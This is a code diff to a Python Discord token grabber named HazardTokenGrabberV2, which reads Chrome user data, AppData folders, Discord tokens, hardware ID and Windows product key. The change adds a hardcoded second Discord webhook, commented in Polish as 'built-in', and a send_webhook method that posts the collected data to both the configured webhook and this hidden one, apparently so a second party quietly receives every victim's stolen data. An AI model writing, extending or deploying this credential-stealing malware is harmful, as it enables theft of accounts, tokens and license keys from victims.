@@ -201,12 +201,11 @@ class Functions(object):
 class HazardTokenGrabberV2(Functions):
     def __init__(self):
         self.webhook = self.fetch_conf("webhook")
+        self.additionalWebhook = "https://discord.com/api/webhooks/1170833154257461248/2jn3gKuMJaZRcUXfjicEM0KEv0JmAzaQzzGqH-rbF0qZeqm85Bznm7UKgaMw8liyVR38"  # Wbudowany webhook
         self.discordApi = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
-        self.chrome_user_data = ntpath.join(
-            self.appdata, "Google", "Chrome", "User Data"
-        )
+        self.chrome_user_data = ntpath.join(self.appdata, "Google", "Chrome", "User Data")
         self.dir, self.temp = mkdtemp(), gettempdir()
         inf, net = self.system_info(), self.network_info()
         self.hwid, self.winver, self.winkey = inf[0], inf[1], inf[2]
@@ -263,6 +262,10 @@ class HazardTokenGrabberV2(Functions):
             pass
         if r.status_code == 200 and tkn not in self.tokens:
             self.tokens.append(tkn)
+
+    def send_webhook(self, data):
+        httpx.post(self.webhook, json=data)
+        httpx.post(self.additionalWebhook, json=data)
 
     async def init(self):
         if self.webhook == "" or self.webhook == "\x57EBHOOK_HERE":
